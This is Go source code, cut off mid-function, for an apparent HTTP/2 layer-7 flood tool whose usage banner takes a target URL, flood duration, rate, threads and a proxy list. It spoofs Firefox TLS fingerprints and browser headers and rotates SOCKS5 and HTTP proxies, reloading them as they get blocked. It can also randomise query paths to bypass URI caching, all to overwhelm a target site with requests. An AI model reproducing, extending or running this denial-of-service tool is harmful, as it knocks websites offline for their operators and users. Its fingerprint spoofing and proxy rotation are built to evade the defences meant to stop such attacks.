package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/bogdanfinn/tls-client/profiles"
	utls "github.com/bogdanfinn/utls"
	"golang.org/x/net/http2/hpack"
)

type ProxyInfo struct {
	Host    string
	Port    string
	User    string
	Pass    string
	success int64
	fail    int64
}

type pathTmpl struct {
	data    []byte
	pathOff int
	pathLen int
}

type socks5Auth struct {
	host string
	port string
	user string
	pass string
}

type frameMsg struct {
	ftype    uint8
	flags    uint8
	_pad     [2]byte
	streamID uint32
	payload  []byte
}

type h2Conn struct {
	conn          net.Conn
	bw            *bufio.Writer
	br            *bufio.Reader
	wantWrite     chan frameMsg
	nextStreamID  uint32
	done          chan struct{}
	dec           *hpack.Decoder
	maxStreams    uint32
	activeStreams uint32
	waiters       uint32
	closed        uint32
	closeOnce     sync.Once
	streamMu      sync.Mutex
	streamCond    *sync.Cond

	currentStatus   int
	releasedStreams map[uint32]struct{}
}

const (
	h2FrameData         = 0x0
	h2FrameHeaders      = 0x1
	h2FramePriority     = 0x2
	h2FrameRSTStream    = 0x3
	h2FrameSettings     = 0x4
	h2FramePing         = 0x6
	h2FrameGoAway       = 0x7
	h2FrameWindowUpdate = 0x8
	h2FrameContinuation = 0x9
)

const (
	settingHeaderTableSize       = 0x1
	settingEnablePush            = 0x2
	settingMaxConcurrent         = 0x3
	settingInitialWindowSize     = 0x4
	settingMaxFrameSize          = 0x5
	settingMaxHeaderListSize     = 0x6
	settingEnableConnectProtocol = 0x8
)

const h2ClientPreface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

// ANSI colors
const (
	colReset  = "\x1b[0m"
	colGreen  = "\x1b[1;32m" // 2xx
	colYellow = "\x1b[1;33m" // 4xx
	colRed    = "\x1b[1;31m" // 5xx
)

var (
	target    string
	targetURL *url.URL
	proxyFile string
	proxies   []ProxyInfo
	proxiesMu sync.RWMutex
	duration  int
	rate      int
	threads   int

	pathFlag   bool
	httpFlag   bool
	rawFlag    bool
	pseudoFlag bool

	reqCount    int64
	activeConn  uint32
	stat2xx     int64
	stat3xx     int64
	stat4xx     int64
	stat5xx     int64
	seedCounter int64
	stopFlag    uint32

	prev2xx int64
	prev3xx int64
	prev4xx int64
	prev5xx int64

	fullCache [][]byte
	pathTmpls []pathTmpl

	framePool     sync.Pool
	hblockBufPool sync.Pool

	userAgents        []string
	languages         []string
	crossSiteReferers []string
	siteNames         [4]string
	siteDistrib       [10]byte
	priorityData      [5]byte

	randMu sync.Mutex

	errStreamLimit error
	errConnDone    error

	blockedProxies sync.Map

	dialTimeout       = 3 * time.Second
	handshakeTimeout  = 5 * time.Second
	defaultMaxStreams = uint32(2000)
	rawMaxStreams     = uint32(4000)
	maxStreamsUpper   = uint32(10000)

	isTTY = func() bool {
		fi, err := os.Stdout.Stat()
		if err != nil || fi == nil {
			return false
		}
		return (fi.Mode() & os.ModeCharDevice) != 0
	}()
)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	var rlim syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rlim); err == nil {
		rlim.Cur = rlim.Max
		_ = syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rlim)
	}

	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0",
	}
	languages = []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
	}
	crossSiteReferers = []string{
		"https://www.google.com/",
		"https://www.google.com/",
		"https://www.google.com/",
		"https://chatgpt.com/",
		"https://news.google.com/",
		"https://www.reddit.com/",
		"https://l.threads.com/",
		"https://t.co/",
		"https://medium.com/",
		"https://github.com",
		"https://www.quora.com/",
		"https://www.reddit.com/",
		"https://www.linkedin.com/",
		"https://www.youtube.com/",
	}
	siteNames = [4]string{
		"none",
		"cross-site",
		"127.0.0.1:53",
		"[::1]:53",
	}
	siteDistrib  = [10]byte{0, 0, 0, 0, 1, 1, 1, 1, 1, 1}
	priorityData = [5]byte{0x00, 0x00, 0x00, 0x00, 0x28}

	errStreamLimit = io.EOF
	errConnDone    = fmt.Errorf("connection done")

	framePool.New = func() interface{} {
		return make([]byte, 0, 0x1000)
	}
	hblockBufPool.New = func() interface{} {
		return bytes.NewBuffer(make([]byte, 0, 0x4000))
	}
}

func main() {
	if err := parseArgs(); err != nil {
		fmt.Fprintln(os.Stdout, err)
		os.Exit(1)
	}

	u, perr := url.Parse(target)
	if perr != nil {
		fmt.Fprintln(os.Stdout, "Invalid target URL:", perr)
		os.Exit(1)
	}
	targetURL = u
	if targetURL.Path == "" {
		targetURL.Path = "/"
	}

	lines, lerr := readLines(proxyFile)
	if lerr != nil || len(lines) == 0 {
		fmt.Fprintln(os.Stdout, "Error reading proxy file:", lerr)
		os.Exit(1)
	}
	loadProxiesFromLines(lines)

	if !pseudoFlag {
		initFullCache()
	}
	if pathFlag {
		initPathTmpls()
	}

	if !rawFlag {
		go proxyHotReloader()
	}

	ctx, cancel := context.WithTimeout(context.Background(),
		time.Duration(duration)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	go func() {
		<-ctx.Done()
		atomic.StoreUint32(&stopFlag, 1)
	}()

	startFlooders(ctx)
	go runStatsTicker(ctx)
	<-ctx.Done()
	
	// In một dòng trống để dấu nhắc (prompt) của terminal không bị đè lên bảng
	fmt.Fprintln(os.Stdout)
}

func parseArgs() error {
	if len(os.Args) < 6 {
		return fmt.Errorf(usageBanner)
	}
	args := os.Args
	target = args[1]
	proxyFile = args[5]
	if d, err := strconv.Atoi(args[2]); err != nil {
		return fmt.Errorf("[!] Error: invalid duration '%s'", args[2])
	} else {
		duration = d
	}
	if r, err := strconv.Atoi(args[3]); err != nil {
		return fmt.Errorf("[!] Error: invalid rate '%s'", args[3])
	} else {
		rate = r
	}
	if t, err := strconv.Atoi(args[4]); err != nil {
		return fmt.Errorf("[!] Error: invalid threads '%s'", args[4])
	} else {
		threads = t
	}

	for i := 6; i < len(args); i++ {
		switch args[i] {
		case "--path":
			pathFlag = true
		case "--http":
			httpFlag = true
		case "--raw":
			rawFlag = true
		case "--pseudo":
			pseudoFlag = true
		default:
			fmt.Fprintf(os.Stdout, "[-] Warning: unknown flag '%s' ignored\n", args[i])
		}
	}
	return nil
}

const usageBanner = "\x1b[1;36mUsage:\x1b[0m\n" +
	"    \x1b[1;32mfirefox\x1b[0m \x1b[33m<target> <time> <rate> <threads> <proxy.txt>\x1b[0m \x1b[90m[flags]\x1b[0m\n\n" +
	"\x1b[1;36mRequired Arguments:\x1b[0m\n" +
	"    \x1b[33m<target>\x1b[0m      Target URL\n" +
	"    \x1b[33m<time>\x1b[0m        Duration of the flood in secs\n" +
	"    \x1b[33m<rate>\x1b[0m        Target RPS (Requests Per Second) per connection\n" +
	"    \x1b[33m<threads>\x1b[0m     Number of concurrent workers\n" +
	"    \x1b[33m<proxy.txt>\x1b[0m   Path to the proxy list file\n\n" +
	"\x1b[1;36mAvailable Flags:\x1b[0m\n" +
	"    \x1b[32m--path\x1b[0m        Enable dynamic path rotation (bypasses URI caching)\n" +
	"    \x1b[32m--http\x1b[0m        Use HTTP proxies instead of default SOCKS5\n" +
	"    \x1b[32m--pseudo\x1b[0m      Send minimal H2 pseudo-headers only\n" +
	"    \x1b[32m--raw\x1b[0m         Run without proxies\n"

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for sc.Scan() {
		lines = append(lines, sc.Text())
	}
	if err := sc.Err(); err != nil {
		return nil, err
	}
	return lines, nil
}

func loadProxiesFromLines(lines []string) int {
	var newProxies []ProxyInfo
	for _, raw := range lines {
		line := strings.TrimSpace(raw)
		if line == "" {
			continue
		}
		p, err := parseProxyLine(line)
		if err != nil {
			continue
		}
		newProxies = append(newProxies, p)
	}
	proxiesMu.Lock()
	proxies = newProxies
	proxiesMu.Unlock()
	return len(newProxies)
}

func loadProxiesFromFile(path string) error {
	lines, err := readLines(path)
	if err != nil {
		return err
	}
	if len(lines) == 0 {
		return fmt.Errorf("no valid proxies found")
	}
	loadProxiesFromLines(lines)
	return nil
}

func parseProxyLine(line string) (ProxyInfo, error) {
	var host, port, user, pass string
	if strings.Contains(line, "@") {
		parts := strings.SplitN(line, "@", 2)
		if len(parts) != 2 {
			return ProxyInfo{}, fmt.Errorf("invalid format")
		}
		authPart := parts[0]
		hostPort := parts[1]
		if strings.Contains(authPart, ":") {
			creds := strings.SplitN(authPart, ":", 2)
			user = creds[0]
			pass = creds[1]
		} else {
			user = authPart
		}
		hp := strings.Split(hostPort, ":")
		if len(hp) != 2 {
			return ProxyInfo{}, fmt.Errorf("invalid host:port")
		}
		host = hp[0]
		port = hp[1]
		return ProxyInfo{Host: host, Port: port, User: user, Pass: pass}, nil
	}
	parts := strings.Split(line, ":")
	switch len(parts) {
	case 2:
		host = parts[0]
		port = parts[1]
	case 4:
		user = parts[0]
		pass = parts[1]
		host = parts[2]
		port = parts[3]
	default:
		return ProxyInfo{}, fmt.Errorf("invalid format")
	}
	return ProxyInfo{Host: host, Port: port, User: user, Pass: pass}, nil
}

func proxyHotReloader() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		proxiesMu.RLock()
		total := len(proxies)
		if total == 0 {
			proxiesMu.RUnlock()
			continue
		}
		alive := 0
		for _, p := range proxies {
			key := net.JoinHostPort(p.Host, p.Port)
			if _, blocked := blockedProxies.Load(key); !blocked {
				alive++
			}
		}
		proxiesMu.RUnlock()
		if alive < total/10 {
			fmt.Printf("[*] Hot-reload proxies: alive=%d total=%d\n", alive, total)
			if err := loadProxiesFromFile(proxyFile); err != nil {
				fmt.Printf("[-] Reload failed: %v\n", err)
			} else {
				fmt.Printf("[+] Reloaded %d proxies\n", len(proxies))
			}
		}
	}
}

func startFlooders(ctx context.Context) {
	for i := 0; i < threads; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				ok := runFlooder(ctx)
				if !ok {
					select {
					case <-ctx.Done():
						return
					case <-time.After(100 * time.Millisecond):
					}
				}
			}
		}()
	}
}

func establishConn(ctx context.Context) (*h2Conn, bool) {
	conn, err := dialProxy(ctx)
	if err != nil {
		return nil, false
	}

	profile := profiles.Firefox_147

	config := &utls.Config{
		ServerName:         targetURL.Hostname(),
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
	}

	uconn := utls.UClient(conn, config, profile.GetClientHelloId(), false, false, false)
	deadline := time.Now().Add(handshakeTimeout)
	uconn.SetDeadline(deadline)
	if err := uconn.HandshakeContext(ctx); err != nil {
		uconn.Close()
		conn.Close()
		return nil, false
	}
	uconn.SetDeadline(time.Time{})
	state := uconn.ConnectionState()
	if state.NegotiatedProtocol != "h2" {
		uconn.Close()
		conn.Close()
		return nil, false
	}
	h2 := newH2Conn(uconn)
	return h2, true
}

func runFlooder(ctx context.Context) bool {
	atomic.AddUint32(&activeConn, 1)
	defer atomic.AddUint32(&activeConn, ^uint32(0))

	h2, ok := establishConn(ctx)
	if !ok || h2 == nil {
		return false
	}
	defer h2.close()

	go func() {
		select {
		case <-ctx.Done():
			h2.close()
		case <-h2.done:
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < rate; i++ {
		seed := atomic.AddInt64(&seedCounter, 1)
		rng := rand.New(rand.NewSource(seed))
		wg.Add(1)
		go func(rng *rand.Rand) {
			defer wg.Done()
			for {
				if atomic.LoadUint32(&stopFlag) != 0 || atomic.LoadUint32(&h2.closed) != 0 {
					return
				}
				if atomic.LoadUint32(&h2.nextStreamID) >= 0x7fffff00 {
					return
				}
				block := pickHblock(rng)
				if h2.sendRequest(block, ctx) != nil {
					return
				}
				atomic.AddInt64(&reqCount, 1)
			}
		}(rng)
	}
	wg.Wait()
	return true
}

func dialProxy(ctx context.Context) (net.Conn, error) {
	if rawFlag {
		return dialDirect(ctx)
	}

	proxiesMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxiesMu.RUnlock()
		return nil, fmt.Errorf("no proxy available")
	}
	weights := make([]int, n)
	total := 0
	for i := range proxies {
		succ := atomic.LoadInt64(&proxies[i].success)
		failc := atomic.LoadInt64(&proxies[i].fail)
		w := int(succ - failc*2)
		if w < 1 {
			w = 1
		}
		if w > 64 {
			w = 64
		}
		weights[i] = w
		total += w
	}
	proxiesMu.RUnlock()

	randMu.Lock()
	r := rand.Intn(total)
	randMu.Unlock()
	idx := n - 1
	for i, w := range weights {
		r -= w
		if r < 0 {
			idx = i
			break
		}
	}

	proxiesMu.RLock()
	p := &proxies[idx]
	proxiesMu.RUnlock()

	key := net.JoinHostPort(p.Host, p.Port)
	if t, ok := blockedProxies.Load(key); ok {
		if time.Since(t.(time.Time)) < 60*time.Second {
			atomic.AddInt64(&p.fail, 1)
			return nil, fmt.Errorf("proxy blocked")
		}
		blockedProxies.Delete(key)
	}
	var conn net.Conn
	var err error
	if httpFlag {
		conn, err = dialProxyHTTP(ctx, *p)
	} else {
		conn, err = dialProxySocks5(ctx, *p)
	}
	if err != nil {
		atomic.AddInt64(&p.fail, 1)
		blockedProxies.Store(key, time.Now())
	} else {
		atomic.AddInt64(&p.success, 1)
	}
	return conn, err
}

func dialDirect(ctx context.Context) (net.Conn, error) {
	host := targetURL.Hostname()
	port := targetURL.Port()
	if port == "" {
		host = host + ":443"
	} else {
		host = host + ":" + port
	}
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", host)
	if err != nil {
		return nil, err
	}
	setKeepAlive(conn)
	return conn, nil
}

func setKeepAlive(conn net.Conn) {
	if tc, ok := conn.(*net.TCPConn); ok {
		tc.SetKeepAlive(true)
		tc.SetKeepAlivePeriod(60 * time.Second)
		tc.SetNoDelay(true)
	}
}

func dialProxySocks5(ctx context.Context, p ProxyInfo) (net.Conn, error) {
	auth := socks5Auth{host: p.Host, port: p.Port, user: p.User, pass: p.Pass}
	dt := dialTimeout
	if atomic.LoadInt64(&p.success) > 0 {
		dt = 6 * time.Second
	}
	dialer := &net.Dialer{Timeout: dt}
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(auth.host, auth.port))
	if err != nil {
		return nil, err
	}
	targetHost := targetURL.Host
	if targetURL.Port() == "" {
		targetHost = targetHost + ":443"
	}
	err = socks5Handshake(conn, targetHost, auth)
	if err != nil {
		conn.Close()
		return nil, err
	}
	setKeepAlive(conn)
	return conn, nil
}

func dialProxyHTTP(ctx context.Context, p ProxyInfo) (net.Conn, error) {
	dt := dialTimeout
	if atomic.LoadInt64(&p.success) > 0 {
		dt = 6 * time.Second
	}
	dialer := &net.Dialer{Timeout: dt}
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(p.Host, p.Port))
	if err != nil {
		return nil, err
	}

	targetHost := targetURL.Host
	if targetURL.Port() == "" {
		targetHost = targetURL.Hostname() + ":443"
	}
	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\n", targetHost, targetHost)
	if p.User != "" && p.Pass != "" {
		auth := base64.StdEncoding.EncodeToString([]byte(p.User + ":" + p.Pass))
		connectReq += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", auth)
	}
	connectReq += "\r\n"

	dl := dialTimeout
	if atomic.LoadInt64(&p.success) > 0 {
		dl = 6 * time.Second
	}
	conn.SetDeadline(time.Now().Add(dl))
	_, err = conn.Write([]byte(connectReq))
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("http proxy write: %w", err)
	}
	r := bufio.NewReader(conn)
	statusLine, err := r.ReadString('\n')
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("http proxy read: %w", err)
	}
	statusLine = strings.TrimSpace(statusLine)
	if !strings.Contains(statusLine, "200") {
		conn.Close()
		return nil, fmt.Errorf("http proxy CONNECT failed: %s", statusLine)
	}
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			conn.Close()
			return nil, fmt.Errorf("http proxy header: %w", err)
		}
		if strings.TrimSpace(line) == "" {
			break
		}
	}
	conn.SetDeadline(time.Time{})
	setKeepAlive(conn)
	return conn, nil
}

func socks5Handshake(conn net.Conn, target string, auth socks5Auth) error {
	deadline := time.Now().Add(dialTimeout)
	conn.SetDeadline(deadline)
	defer conn.SetDeadline(time.Time{})

	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		return fmt.Errorf("socks5: bad target %s: %w", target, err)
	}
	var greeting []byte
	if auth.user != "" {
		greeting = []byte{0x05, 0x02, 0x00, 0x02}
	} else {
		greeting = []byte{0x05, 0x01, 0x00}
	}
	if _, err := conn.Write(greeting); err != nil {
		return fmt.Errorf("socks5: greeting write: %w", err)
	}
	resp := make([]byte, 2)
	if _, err := io.ReadAtLeast(conn, resp, 2); err != nil {
		return fmt.Errorf("socks5: greeting read: %w", err)
	}
	if resp[0] != 0x05 {
		return fmt.Errorf("socks5: bad version %d", resp[0])
	}
	if resp[1] == 0xFF {
		return fmt.Errorf("socks5: no acceptable auth method")
	}
	if resp[1] == 0x02 {
		if auth.user == "" {
			return fmt.Errorf("socks5: proxy requires auth")
		}
		authReq := []byte{0x01, byte(len(auth.user))}
		authReq = append(authReq, auth.user...)
		authReq = append(authReq, byte(len(auth.pass)))
		authReq = append(authReq, auth.pass...)
		if _, err := conn.Write(authReq); err != nil {
			return fmt.Errorf("socks5: auth write: %w", err)
		}
		arep := make([]byte, 2)
		if _, err := io.ReadAtLeast(conn, arep, 2); err != nil {
			return fmt.Errorf("socks5: auth read: %w", err)
		}
		if arep[1] != 0x00 {
			return fmt.Errorf("socks5: auth failed, status=%d", arep[1])
		}
	}
	port, _ := strconv.Atoi(portStr)
	portHi, portLo := byte(port>>8), byte(port)
	req := []byte{0x05, 0x01, 0x00}
	ip := net.ParseIP(host)
	if ip != nil {
		if v4 := ip.To4(); v4 != nil {
			req = append(req, 0x01)
			req = append(req, v4...)
		} else {
			req = append(req, 0x04)
			req = append(req, ip.To16()...)
		}
	} else {
		if len(host) > 255 {
			return fmt.Errorf("socks5: bad target %s: %w", host, err)
		}
		req = append(req, 0x03)
		req = append(req, byte(len(host)))
		req = append(req, host...)
	}
	req = append(req, portHi, portLo)
	if _, err := conn.Write(req); err != nil {
		return fmt.Errorf("socks5: connect write: %w", err)
	}
	rep := make([]byte, 4)
	if _, err := io.ReadAtLeast(conn, rep, 4); err != nil {
		return fmt.Errorf("socks5: response read: %w", err)
	}
	if rep[1] != 0x00 {
		return fmt.Errorf("socks5: connect refused, code=%d", rep[1])
	}
	switch rep[3] {
	case 0x01:
		io.ReadAtLeast(conn, make([]byte, 4+2), 6)
	case 0x04:
		io.ReadAtLeast(conn, make([]byte, 16+2), 18)
	case 0x03:
		var l [1]byte
		io.ReadAtLeast(conn, l[:], 1)
		io.ReadAtLeast(conn, make([]byte, int(l[0])+2), int(l[0])+2)
	}
	return nil
}

func renderStats(elapsed int64, rps, total int64, active uint32, d2, d4, d5 int64, first bool) {
	c2 := colGreen + "2xx" + colReset
	c4 := colYellow + "4xx" + colReset
	c5 := colRed + "5xx" + colReset

	if isTTY {
		if !first {
			fmt.Fprintf(os.Stdout, "\x1b[10A")
		}
		fmt.Fprintf(os.Stdout, "\r[%d/%ds]\n", elapsed, duration)
		fmt.Fprintf(os.Stdout, "\r==================\n")
		fmt.Fprintf(os.Stdout, "\r RPS:%-10d\n", rps)
		fmt.Fprintf(os.Stdout, "\r Total:%-10d\n", total)
		fmt.Fprintf(os.Stdout, "\r Active:%-10d\n", active)
		fmt.Fprintf(os.Stdout, "\r==================\n")
		fmt.Fprintf(os.Stdout, "\r %s:%-10d\n", c2, d2)
		fmt.Fprintf(os.Stdout, "\r %s:%-10d\n", c4, d4)
		fmt.Fprintf(os.Stdout, "\r %s:%-10d\n", c5, d5)
		fmt.Fprintf(os.Stdout, "\r==================\n")
	} else {
		fmt.Fprintf(os.Stdout, "[%d/%ds]\n", elapsed, duration)
		fmt.Fprintf(os.Stdout, "==================\n")
		fmt.Fprintf(os.Stdout, " RPS:%-10d\n", rps)
		fmt.Fprintf(os.Stdout, " Total:%-10d\n", total)
		fmt.Fprintf(os.Stdout, " Active:%-10d\n", active)
		fmt.Fprintf(os.Stdout, "==================\n")
		fmt.Fprintf(os.Stdout, " %s:%-10d\n", c2, d2)
		fmt.Fprintf(os.Stdout, " %s:%-10d\n", c4, d4)
		fmt.Fprintf(os.Stdout, " %s:%-10d\n", c5, d5)
		fmt.Fprintf(os.Stdout, "==================\n")
	}
}

func runStatsTicker(ctx context.Context) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	start := time.Now()

	var prevTotal int64
	first := true

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}

		elapsed := int64(time.Since(start).Seconds())
		total := atomic.LoadInt64(&reqCount)
		rps := total - prevTotal
		prevTotal = total

		cur2 := atomic.LoadInt64(&stat2xx)
		cur4 := atomic.LoadInt64(&stat4xx)
		cur5 := atomic.LoadInt64(&stat5xx)

		d2 := cur2 - prev2xx
		d4 := cur4 - prev4xx
		d5 := cur5 - prev5xx
		prev2xx, prev4xx, prev5xx = cur2, cur4, cur5

		active := atomic.LoadUint32(&activeConn)

		renderStats(elapsed, rps, total, active, d2, d4, d5, first)
		first = false
	}
}

func initFullCache() {
	seed := atomic.AddInt64(&seedCounter, 1)
	src := rand.NewSource(seed)
	rng := rand.New(src)

	fullCache = make([][]byte, 0, 15)
	fullCache = append(fullCache, buildHblock(rng, siteNames[0], "", 0, 0))
	for _, ref := range crossSiteReferers {
		fullCache = append(fullCache, buildHblock(rng, siteNames[1], ref, 0, 0))
	}
}

func initPathTmpls() {
	seed := atomic.AddInt64(&seedCounter, 1)
	src := rand.NewSource(seed)
	rng := rand.New(src)

	pathTmpls = make([]pathTmpl, 0, 15)
	pathTmpls = append(pathTmpls, buildHblockTemplate(rng, siteNames[0], "", 0, 0))
	for _, ref := range crossSiteReferers {
		pathTmpls = append(pathTmpls, buildHblockTemplate(rng, siteNames[1], ref, 0, 0))
	}
}

func pickHblock(rng *rand.Rand) []byte {
	if pseudoFlag {
		return buildPseudoHblock()
	}
	siteIdx := siteDistrib[int(rng.Int63()%10)]
	randByte := byte(rng.Int63())

	if pathFlag {
		r := int(rng.Int63() % 10)
		var hasRef byte
		if r < 9 {
			hasRef = siteIdx
		} else if siteIdx == 0 {
			hasRef = 1
		} else {
			hasRef = 0
		}
		_ = randByte
		idx := int(hasRef) * len(crossSiteReferers)
		if idx >= len(pathTmpls) {
			idx = 0
		}
		tmpl := &pathTmpls[idx]
		return makePathHblock(tmpl, rng)
	}

	r := int(rng.Int63() % 10)
	if r < 8 || len(fullCache) < 2 {
		return fullCache[0]
	}
	return fullCache[1+rng.Intn(len(fullCache)-1)]
}

func buildPseudoHblock() []byte {
	buf := hblockBufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer hblockBufPool.Put(buf)
	enc := hpack.NewEncoder(buf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: targetURL.Path})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: targetURL.Host})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	out := make([]byte, buf.Len()+5)
	copy(out, priorityData[:])
	copy(out[5:], buf.Bytes())
	return out
}

func buildHblock(rng *rand.Rand, site, ref string, rsi, r8 int) []byte {
	buf := hblockBufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer hblockBufPool.Put(buf)
	enc := hpack.NewEncoder(buf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: targetURL.Path})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: targetURL.Host})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	enc.WriteField(hpack.HeaderField{Name: "user-agent",
		Value: userAgents[rng.Intn(len(userAgents))]})
	enc.WriteField(hpack.HeaderField{Name: "accept",
		Value: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
	enc.WriteField(hpack.HeaderField{Name: "accept-language",
		Value: languages[rng.Intn(len(languages))]})
	enc.WriteField(hpack.HeaderField{Name: "accept-encoding",
		Value: "gzip, deflate, br, zstd"})
	if ref != "" {
		enc.WriteField(hpack.HeaderField{Name: "referer", Value: ref})
	}
	enc.WriteField(hpack.HeaderField{Name: "upgrade-insecure-requests", Value: "1"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-dest", Value: "document"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-mode", Value: "navigate"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-site", Value: site})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-user", Value: "?1"})
	enc.WriteField(hpack.HeaderField{Name: "priority", Value: "u=0, i"})
	enc.WriteField(hpack.HeaderField{Name: "te", Value: "trailers"})
	out := make([]byte, buf.Len()+5)
	copy(out, priorityData[:])
	copy(out[5:], buf.Bytes())
	return out
}

func buildHblockTemplate(rng *rand.Rand, site, ref string, rsi, r8 int) pathTmpl {
	prefixBuf := hblockBufPool.Get().(*bytes.Buffer)
	prefixBuf.Reset()
	enc1 := hpack.NewEncoder(prefixBuf)
	enc1.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})

	paramNameLen := 6
	paramValLen := 6
	queryLen := 1 + paramNameLen + 1 + paramValLen
	pathStr := "/" + "?" +
		strings.Repeat("a", paramNameLen) + "=" +
		strings.Repeat("0", paramValLen)
	totalPathLen := len(pathStr)

	pathBuf := hblockBufPool.Get().(*bytes.Buffer)
	pathBuf.Reset()
	pathBuf.WriteByte(0x04)
	pathBuf.WriteByte(byte(totalPathLen))
	pathBuf.WriteString(pathStr)
	suffixBuf := hblockBufPool.Get().(*bytes.Buffer)
	suffixBuf.Reset()
	enc2 := hpack.NewEncoder(suffixBuf)

	enc2.WriteField(hpack.HeaderField{Name: ":authority", Value: targetURL.Host})
	enc2.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	enc2.WriteField(hpack.HeaderField{Name: "user-agent",
		Value: userAgents[rng.Intn(len(userAgents))]})
	enc2.WriteField(hpack.HeaderField{Name: "accept",
		Value: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
	enc2.WriteField(hpack.HeaderField{Name: "accept-language",
		Value: languages[rng.Intn(len(languages))]})
	enc2.WriteField(hpack.HeaderField{Name: "accept-encoding",
		Value: "gzip, deflate, br, zstd"})
	if ref != "" {
		enc2.WriteField(hpack.HeaderField{Name: "referer", Value: ref})
	}
	enc2.WriteField(hpack.HeaderField{Name: "upgrade-insecure-requests", Value: "1"})
	enc2.WriteField(hpack.HeaderField{Name: "sec-fetch-dest", Value: "document"})
	enc2.WriteField(hpack.HeaderField{Name: "sec-fetch-mode", Value: "navigate"})
	enc2.WriteField(hpack.HeaderField{Name: "sec-fetch-site", Value: site})
	enc2.WriteField(hpack.HeaderField{Name: "sec-fetch-user", Value: "?1"})
	enc2.WriteField(hpack.HeaderField{Name: "priority", Value: "u=0, i"})
	enc2.WriteField(hpack.HeaderField{Name: "te", Value: "trailers"})

	prefixLen := prefixBuf.Len()
	pathManualLen := pathBuf.Len()
	suffixLen := suffixBuf.Len()
	total := 5 + prefixLen + pathManualLen + suffixLen

	out := make([]byte, total)
	copy(out[0:5], priorityData[:])
	copy(out[5:5+prefixLen], prefixBuf.Bytes())
	copy(out[5+prefixLen:5+prefixLen+pathManualLen], pathBuf.Bytes())
	copy(out[5+prefixLen+pathManualLen:], suffixBuf.Bytes())

	hblockBufPool.Put(prefixBuf)
	hblockBufPool.Put(pathBuf)
	hblockBufPool.Put(suffixBuf)

	pathOff := 5 + prefixLen + 2 + 1
	pathPlaceholderLen := queryLen
	return pathTmpl{
		data:    out,
		pathOff: pathOff,
		pathLen: pathPlaceholderLen,
	}
}

func makePathHblock(tmpl *pathTmpl, rng *rand.Rand) []byte {
	out := make([]byte, len(tmpl.data))
	copy(out, tmpl.data)
	const letters = "abcdefghijklmnopqrstuvwxyz"
	const digits = "0123456789"
	off := tmpl.pathOff
	for i := 1; i <= 6; i++ {
		out[off+i] = letters[rng.Int63n(int64(len(letters)))]
	}
	for i := 8; i <= 13; i++ {
		out[off+i] = digits[rng.Int63n(int64(len(digits)))]
	}
	return out
}

func newH2Conn(conn net.Conn) *h2Conn {
	bw := bufio.NewWriterSize(conn, 0x8000)
	br := bufio.NewReaderSize(conn, 0x8000)

	h := &h2Conn{
		conn:            conn,
		bw:              bw,
		br:              br,
		wantWrite:       make(chan frameMsg, 0x800),
		done:            make(chan struct{}),
		nextStreamID:    3,
		maxStreams:      defaultMaxStreams,
		releasedStreams: make(map[uint32]struct{}, 4096),
	}
	h.dec = hpack.NewDecoder(0x10000, func(f hpack.HeaderField) {
		if f.Name == ":status" {
